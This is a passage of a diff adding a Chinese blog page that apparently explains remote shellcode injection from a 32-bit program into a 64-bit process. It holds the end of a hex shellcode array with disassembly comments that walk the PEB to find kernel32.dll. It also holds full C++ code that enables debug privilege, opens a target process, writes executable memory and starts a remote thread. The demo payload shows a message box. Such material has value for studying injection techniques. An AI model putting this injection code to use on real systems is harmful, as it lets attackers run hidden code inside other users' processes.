+    /* 05E8 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05E9 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05EA */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05EB */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05EC */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05ED */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05EE */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05EF */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05F0 */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */
+    /* 05F5 */ &quot;\x48\x83\xec\x18&quot;                                 /* sub rsp, 0x18                            */
+    /* 05F9 */ &quot;\xc7\x04\x24\x00\x00\x00\x00&quot;                     /* mov dword [rsp], 0x0                     */
+    /* 0600 */ &quot;\x48\x8b\x44\x24\x20&quot;                             /* mov rax, [rsp+0x20]                      */
+    /* 0605 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */
+    /* 060A */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */
+    /* 060D */ &quot;\xc1\xe0\x07&quot;                                     /* shl eax, 0x7                             */
+    /* 0610 */ &quot;\x8b\x0c\x24&quot;                                     /* mov ecx, [rsp]                           */
+    /* 0613 */ &quot;\xc1\xe9\x19&quot;                                     /* shr ecx, 0x19                            */
+    /* 0616 */ &quot;\x03\xc1&quot;                                         /* add eax, ecx                             */
+    /* 0618 */ &quot;\x48\x8b\x4c\x24\x08&quot;                             /* mov rcx, [rsp+0x8]                       */
+    /* 061D */ &quot;\x0f\xb6\x09&quot;                                     /* movzx ecx, byte [rcx]                    */
+    /* 0620 */ &quot;\x03\xc1&quot;                                         /* add eax, ecx                             */
+    /* 0622 */ &quot;\x89\x04\x24&quot;                                     /* mov [rsp], eax                           */
+    /* 0625 */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */
+    /* 062A */ &quot;\x0f\xb6\x00&quot;                                     /* movzx eax, byte [rax]                    */
+    /* 062D */ &quot;\x89\x44\x24\x04&quot;                                 /* mov [rsp+0x4], eax                       */
+    /* 0631 */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */
+    /* 0636 */ &quot;\x48\xff\xc0&quot;                                     /* inc rax                                  */
+    /* 0639 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */
+    /* 063E */ &quot;\x83\x7c\x24\x04\x00&quot;                             /* cmp dword [rsp+0x4], 0x0                 */
+    /* 0643 */ &quot;\x75\xc5&quot;                                         /* jnz 0x60a                                */
+    /* 0645 */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */
+    /* 0648 */ &quot;\x48\x83\xc4\x18&quot;                                 /* add rsp, 0x18                            */
+    /* 064C */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 064D */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 064E */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 064F */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0650 */ &quot;\x48\x81\xec\x88\x02\x00\x00&quot;                     /* sub rsp, 0x288                           */
+    /* 0657 */ &quot;\x48\xc7\x44\x24\x60\xff\xff\xff\xff&quot;             /* mov qword [rsp+0x60], 0xffffffffffffffff */
+    /* 0660 */ &quot;\x65\x48\x8b\x04\x25\x60\x00\x00\x00&quot;             /* mov rax, [gs:0x60]                       */
+    /* 0669 */ &quot;\x48\x89\x44\x24\x68&quot;                             /* mov [rsp+0x68], rax                      */
+    /* 066E */ &quot;\x48\x8b\x44\x24\x68&quot;                             /* mov rax, [rsp+0x68]                      */
+    /* 0673 */ &quot;\x48\x8b\x40\x18&quot;                                 /* mov rax, [rax+0x18]                      */
+    /* 0677 */ &quot;\x48\x83\xc0\x20&quot;                                 /* add rax, 0x20                            */
+    /* 067B */ &quot;\x48\x89\x44\x24\x58&quot;                             /* mov [rsp+0x58], rax                      */
+    /* 0680 */ &quot;\x48\x8b\x44\x24\x58&quot;                             /* mov rax, [rsp+0x58]                      */
+    /* 0685 */ &quot;\x48\x8b\x00&quot;                                     /* mov rax, [rax]                           */
+    /* 0688 */ &quot;\x48\x89\x44\x24\x30&quot;                             /* mov [rsp+0x30], rax                      */
+    /* 068D */ &quot;\xb8\x6b\x00\x00\x00&quot;                             /* mov eax, 0x6b                            */
+    /* 0692 */ &quot;\x66\x89\x44\x24\x38&quot;                             /* mov [rsp+0x38], ax                       */
+    /* 0697 */ &quot;\xb8\x65\x00\x00\x00&quot;                             /* mov eax, 0x65                            */
+    /* 069C */ &quot;\x66\x89\x44\x24\x3a&quot;                             /* mov [rsp+0x3a], ax                       */
+    /* 06A1 */ &quot;\xb8\x72\x00\x00\x00&quot;                             /* mov eax, 0x72                            */
+    /* 06A6 */ &quot;\x66\x89\x44\x24\x3c&quot;                             /* mov [rsp+0x3c], ax                       */
+    /* 06AB */ &quot;\xb8\x6e\x00\x00\x00&quot;                             /* mov eax, 0x6e                            */
+    /* 06B0 */ &quot;\x66\x89\x44\x24\x3e&quot;                             /* mov [rsp+0x3e], ax                       */
+    /* 06B5 */ &quot;\xb8\x65\x00\x00\x00&quot;                             /* mov eax, 0x65                            */
+    /* 06BA */ &quot;\x66\x89\x44\x24\x40&quot;                             /* mov [rsp+0x40], ax                       */
+    /* 06BF */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */
+    /* 06C4 */ &quot;\x66\x89\x44\x24\x42&quot;                             /* mov [rsp+0x42], ax                       */
+    /* 06C9 */ &quot;\xb8\x33\x00\x00\x00&quot;                             /* mov eax, 0x33                            */
+    /* 06CE */ &quot;\x66\x89\x44\x24\x44&quot;                             /* mov [rsp+0x44], ax                       */
+    /* 06D3 */ &quot;\xb8\x32\x00\x00\x00&quot;                             /* mov eax, 0x32                            */
+    /* 06D8 */ &quot;\x66\x89\x44\x24\x46&quot;                             /* mov [rsp+0x46], ax                       */
+    /* 06DD */ &quot;\xb8\x2e\x00\x00\x00&quot;                             /* mov eax, 0x2e                            */
+    /* 06E2 */ &quot;\x66\x89\x44\x24\x48&quot;                             /* mov [rsp+0x48], ax                       */
+    /* 06E7 */ &quot;\xb8\x64\x00\x00\x00&quot;                             /* mov eax, 0x64                            */
+    /* 06EC */ &quot;\x66\x89\x44\x24\x4a&quot;                             /* mov [rsp+0x4a], ax                       */
+    /* 06F1 */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */
+    /* 06F6 */ &quot;\x66\x89\x44\x24\x4c&quot;                             /* mov [rsp+0x4c], ax                       */
+    /* 06FB */ &quot;\xb8\x6c\x00\x00\x00&quot;                             /* mov eax, 0x6c                            */
+    /* 0700 */ &quot;\x66\x89\x44\x24\x4e&quot;                             /* mov [rsp+0x4e], ax                       */
+    /* 0705 */ &quot;\x33\xc0&quot;                                         /* xor eax, eax                             */
+    /* 0707 */ &quot;\x66\x89\x44\x24\x50&quot;                             /* mov [rsp+0x50], ax                       */
+    /* 070C */ &quot;\x48\x8b\x44\x24\x58&quot;                             /* mov rax, [rsp+0x58]                      */
+    /* 0711 */ &quot;\x48\x39\x44\x24\x30&quot;                             /* cmp [rsp+0x30], rax                      */
+    /* 0716 */ &quot;\x0f\x84\x8b\x00\x00\x00&quot;                         /* jz 0x7a7                                 */
+    /* 071C */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */
+    /* 0721 */ &quot;\x48\x83\xe8\x10&quot;                                 /* sub rax, 0x10                            */
+    /* 0725 */ &quot;\x48\x89\x44\x24\x28&quot;                             /* mov [rsp+0x28], rax                      */
+    /* 072A */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */
+    /* 072F */ &quot;\x0f\xb7\x40\x48&quot;                                 /* movzx eax, word [rax+0x48]               */
+    /* 0733 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 0735 */ &quot;\x74\x5e&quot;                                         /* jz 0x795                                 */
+    /* 0737 */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */
+    /* 073C */ &quot;\x0f\xb7\x40\x48&quot;                                 /* movzx eax, word [rax+0x48]               */
+    /* 0740 */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */
+    /* 0744 */ &quot;\x44\x8b\x44\x24\x20&quot;                             /* mov r8d, [rsp+0x20]                      */
+    /* 0749 */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */
+    /* 074E */ &quot;\x48\x8b\x50\x50&quot;                                 /* mov rdx, [rax+0x50]                      */
+    /* 0752 */ &quot;\x48\x8d\x4c\x24\x70&quot;                             /* lea rcx, [rsp+0x70]                      */
+    /* 0757 */ &quot;\xe8\x14\xfe\xff\xff&quot;                             /* call 0x570                               */
+    /* 075C */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */
+    /* 0760 */ &quot;\x33\xd2&quot;                                         /* xor edx, edx                             */
+    /* 0762 */ &quot;\xb9\x02\x00\x00\x00&quot;                             /* mov ecx, 0x2                             */
+    /* 0767 */ &quot;\x48\xf7\xf1&quot;                                     /* div rcx                                  */
+    /* 076A */ &quot;\x33\xc9&quot;                                         /* xor ecx, ecx                             */
+    /* 076C */ &quot;\x66\x89\x4c\x44\x70&quot;                             /* mov [rsp+rax*2+0x70], cx                 */
+    /* 0771 */ &quot;\x48\x8d\x54\x24\x38&quot;                             /* lea rdx, [rsp+0x38]                      */
+    /* 0776 */ &quot;\x48\x8d\x4c\x24\x70&quot;                             /* lea rcx, [rsp+0x70]                      */
+    /* 077B */ &quot;\xe8\x50\xfc\xff\xff&quot;                             /* call 0x3d0                               */
+    /* 0780 */ &quot;\x48\x85\xc0&quot;                                     /* test rax, rax                            */
+    /* 0783 */ &quot;\x74\x10&quot;                                         /* jz 0x795                                 */
+    /* 0785 */ &quot;\x48\x8b\x44\x24\x28&quot;                             /* mov rax, [rsp+0x28]                      */
+    /* 078A */ &quot;\x48\x8b\x40\x30&quot;                                 /* mov rax, [rax+0x30]                      */
+    /* 078E */ &quot;\x48\x89\x44\x24\x60&quot;                             /* mov [rsp+0x60], rax                      */
+    /* 0793 */ &quot;\xeb\x12&quot;                                         /* jmp 0x7a7                                */
+    /* 0795 */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */
+    /* 079A */ &quot;\x48\x8b\x00&quot;                                     /* mov rax, [rax]                           */
+    /* 079D */ &quot;\x48\x89\x44\x24\x30&quot;                             /* mov [rsp+0x30], rax                      */
+    /* 07A2 */ &quot;\xe9\x65\xff\xff\xff&quot;                             /* jmp 0x70c                                */
+    /* 07A7 */ &quot;\x48\x8b\x44\x24\x60&quot;                             /* mov rax, [rsp+0x60]                      */
+    /* 07AC */ &quot;\x48\x81\xc4\x88\x02\x00\x00&quot;                     /* add rsp, 0x288                           */
+    /* 07B3 */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 07B4 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07B5 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07B6 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07B7 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07B8 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07B9 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07BA */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07BB */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07BC */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07BD */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07BE */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 07BF */ &quot;\xcc&quot;                                             /* int3                                     */
+};
+typedef struct _RemoteParam {
+    char szMsg[12];    //MessageBox函数中显示的字符提示  
+    DWORD dwMessageBox;//MessageBox函数的入口地址  
+} RemoteParam, * PRemoteParam;
+typedef VOID(*pCreateRemoteThread64) (HANDLE hProcess,
+    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
+    DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);
+//定义MessageBox类型的函数指针
+typedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);
+
+DWORD __stdcall threadProc(LPVOID lParam)
+{
+    RemoteParam* pRP = (RemoteParam*)lParam;
+    PFN_MESSAGEBOX pfnMessageBox;
+    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;
+    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);
+    return 0;
+}
+bool enableDebugPriv()
+{
+    HANDLE hToken;
+    LUID sedebugnameValue;
+    TOKEN_PRIVILEGES tkp;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {
+        return false;
+    }
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {
+        CloseHandle(hToken);
+        return false;
+    }
+    tkp.PrivilegeCount = 1;
+    tkp.Privileges[0].Luid = sedebugnameValue;
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {
+        CloseHandle(hToken);
+        return false;
+    }
+    return true;
+}
+HANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)
+{
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (!Process32First(hSnapshot, &amp;pe)) {
+        MessageBoxA(NULL,
+            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+    while (Process32Next(hSnapshot, &amp;pe)) {
+        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {
+            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+        }
+    }
+    return 0;
+}
+LPVOID init_func(char* asmcode, DWORD len)
+{
+    LPVOID sc = NULL;
+    // allocate write/executable memory for code
+    sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (sc != NULL) {
+        // copy code
+        memcpy(sc, asmcode, len);
+    }
+    else {
+        MessageBoxA(NULL, &quot;VirtualAlloc()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+    }
+    return sc;
+}
+int main()
+{
+    const DWORD dwThreadSize = 4096;
+    DWORD dwWriteBytes = 0;
+    enableDebugPriv();
+    HANDLE TargetProc = GetProcessHandleByName(L&quot;CCC.exe&quot;);//进程名称
+    if (!TargetProc)
+    {
+        MessageBoxA(NULL,
+            &quot;Open target process failed !&quot;,
+            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+        return 0;
+    }
+
+    BOOL ISWow64 = false;
+    IsWow64Process(TargetProc, &amp;ISWow64);
+
+    if (ISWow64)
+    {
+        cout &lt;&lt; &quot;32Bit Process &quot; &lt;&lt;endl;
+        //在宿主进程中为线程体开辟一块存储区域  
+        //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  
+        //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  
+        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,
+            dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!pRemoteThread) {
+            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,
+                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+
+        //将线程体拷贝到宿主进程中  
+        if (!WriteProcessMemory(TargetProc,
+            pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {
+            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,
+                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+        cout &lt;&lt; &quot;pRemoteThread:&quot; &lt;&lt; hex &lt;&lt; pRemoteThread &lt;&lt; endl;
+        getchar();
+        //定义线程参数结构体变量  
+        RemoteParam remoteData;
+        ZeroMemory(&amp;remoteData, sizeof(RemoteParam));
+
+        //填充结构体变量中的成员  
+        HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);
+        remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);
+        strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);
+
+        //为线程参数在宿主进程中开辟存储区域  
+        RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(
+            TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);
+
+        if (!pRemoteParam) {
+            MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,
+                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+        //将线程参数拷贝到宿主进程地址空间中  
+        if (!WriteProcessMemory(TargetProc,
+            pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {
+            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,
+                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+
+        //在宿主进程中创建线程  
+        HANDLE hRemoteThread = CreateRemoteThread(
+            TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,
+            pRemoteParam, 0, &amp;dwWriteBytes);
+        if (!hRemoteThread) {
+            MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+        CloseHandle(hRemoteThread);
+        FreeLibrary(hUser32);
+        return 0;
+
+    }
+    else
+    {
+
+        cout &lt;&lt; &quot;64Bit Process &quot; &lt;&lt; endl;
+        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,
+            EXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!pRemoteThread) {
+            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,
+                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+        if (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))
+        {
+            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,
+                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+        HANDLE hThread = NULL;
+        pCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);
+        CreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &amp;hThread);
+        if (!hThread)
+        {
+            MessageBoxA(NULL, &quot;CreateRemoteThread64 target thread failed !&quot;,
+                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);
+            return 0;
+        }
+        WaitForSingleObject(hThread, INFINITE);
+    }
+    return 0;
+}</code></pre>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/cray/tags/安全技术/">安全技术</a>
+                
+              </span>
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container">
+        <div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+      </div>
+    
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>
+      var disqus_config = function () {
+        this.page.url = 'http://l0yy.gitee.io/cray/2020/03/18/32位程序对64位进程的远程注入实现/';
+        this.page.identifier = '/2020/03/18/32位程序对64位进程的远程注入实现/';
+      };
+      var oldLoad = window.onload;
+      window.onload = function () {
+        var d = document, s = d.createElement('script');
+        s.type = 'text/javascript';
+        s.src = '//' + 'https-l0yy-github-io' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      };
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+        powered by Disqus.</a></noscript>
+  </div>
+
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+
+    
+  
+    <!-- 不蒜子统计PV -->
+    
+    &nbsp;<span id="busuanzi_container_site_pv"></span>总访问量 
+          <span id="busuanzi_value_site_pv"></span> 次&nbsp;
+  
+  
+    <!-- 不蒜子统计UV -->
+    
+    &nbsp;<span id="busuanzi_container_site_uv"></span>总访客数 
+            <span id="busuanzi_value_site_uv"></span> 人&nbsp;
+  
+  <br>
+
+
+
+    
+
+
+    <!-- cnzz Analytics icon -->
+    
+
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script src="/cray/js/main.js" ></script>
+
+
+  <script src="/cray/js/lazyload.js" ></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var main = $('main');
+      var tocT = navHeight + (toc.offset().top - main.offset().top);
+      var tocLimMin = main.offset().top - navHeight;
+      var tocLimMax = $('#comments').offset().top - navHeight;
+      $(window).scroll(function () {
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': tocT,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "32->64注入shellcode&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/cray/js/local-search.js" ></script>
+  <script>
+    var path = "/cray/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
